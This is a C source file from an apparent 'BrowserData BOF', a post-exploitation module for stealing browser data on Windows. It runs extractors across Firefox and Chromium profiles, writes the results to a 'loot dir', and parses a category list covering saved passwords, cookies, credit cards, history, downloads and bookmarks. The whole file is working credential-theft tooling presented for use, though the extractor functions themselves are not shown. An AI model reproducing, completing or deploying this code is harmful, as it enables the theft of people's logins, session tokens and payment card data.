/* bd_run.c - orchestration: iterate browsers, run extractors, summarize. */
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include "bd.h"

extern void  *malloc(size_t);
extern void   free(void *);
extern void  *memset(void *, int, size_t);
extern size_t strlen(const char *);
extern int    _snprintf(char *, size_t, const char *, ...);
extern int    _stricmp(const char *, const char *);
extern char  *strchr(const char *, int);
extern char  *bd_strdup(const char *s);

typedef struct {
    const char *want;
    bd_out *out;
    int     catMask;
    int     files;
    int     rows;
} runctx;

static void run_browser(const bd_browser_t *br, runctx *rc) {
    char staging[700];
    bd_out *out = rc->out;

    if (out->logf)
        out->logf(out->ctx, "[*] %s (%s)", br->name, br->key);

    /* per-browser staging dir */
    _snprintf(staging, sizeof(staging), "%s\\stage_%s", out->outDir, br->key);
    bd_mkdir(out->outDir);
    bd_mkdir(staging);

    if (br->kind == BD_KIND_FIREFOX)
        bd_firefox_for_profiles(br, rc->catMask, out, &rc->files);
    else
        bd_chromium_for_profiles(br, rc->catMask, out, &rc->files);
}

int bd_run(const char *browserKey, int catMask, bd_out *out, int *rowsOut) {
    runctx rc;
    int i;

    memset(&rc, 0, sizeof(rc));
    rc.out = out;
    rc.catMask = catMask ? catMask : BD_CAT_ALL;

    if (!out->outDir || !*out->outDir) {
        char *t = bd_temp_dir();
        if (!t) return -1;
        out->outDir = t;
    } else {
        out->outDir = bd_strdup(out->outDir);
    }
    bd_mkdir(out->outDir);

    if (out->logf)
        out->logf(out->ctx, "[*] BrowserData BOF - loot dir: %s", out->outDir);

    if (browserKey && *browserKey && !bd_str_ieq(browserKey, "all")) {
        const bd_browser_t *br = bd_browser_find(browserKey);
        if (!br) {
            if (out->logf)
                out->logf(out->ctx, "[!] unknown browser key: %s", browserKey);
            return -1;
        }
        run_browser(br, &rc);
    } else {
        for (i = 0; i < bd_browser_count(); i++)
            run_browser(bd_browser_at(i), &rc);
    }

    if (out->logf)
        out->logf(out->ctx, "[=] done: %d loot file(s) in %s", rc.files, out->outDir);
    if (rowsOut) *rowsOut = rc.rows;
    free((void *)out->outDir);
    out->outDir = NULL;
    return rc.files;
}

/* helper to build a cat mask from a comma list: "passwords,cookies" or "all" */
int bd_cat_mask_parse(const char *spec) {
    char tmp[256];
    char *tok, *next;
    int mask = 0;
    if (!spec || !*spec || bd_str_ieq(spec, "all")) return BD_CAT_ALL;
    if (strlen(spec) >= sizeof(tmp)) return BD_CAT_ALL;
    _snprintf(tmp, sizeof(tmp), "%s", spec);
    next = tmp;
    while (next && *next) {
        tok = next;
        next = strchr(next, ',');
        if (next) *next++ = 0;
        while (*tok == ' ') tok++;
        if (bd_str_ieq(tok, "passwords") || bd_str_ieq(tok, "password")) mask |= BD_CAT_PASSWORDS;
        else if (bd_str_ieq(tok, "cookies") || bd_str_ieq(tok, "cookie")) mask |= BD_CAT_COOKIES;
        else if (bd_str_ieq(tok, "history")) mask |= BD_CAT_HISTORY;
        else if (bd_str_ieq(tok, "downloads")) mask |= BD_CAT_DOWNLOADS;
        else if (bd_str_ieq(tok, "creditcards") || bd_str_ieq(tok, "cards")) mask |= BD_CAT_CREDITCARDS;
        else if (bd_str_ieq(tok, "bookmarks")) mask |= BD_CAT_BOOKMARKS;
    }
    return mask ? mask : BD_CAT_ALL;
}
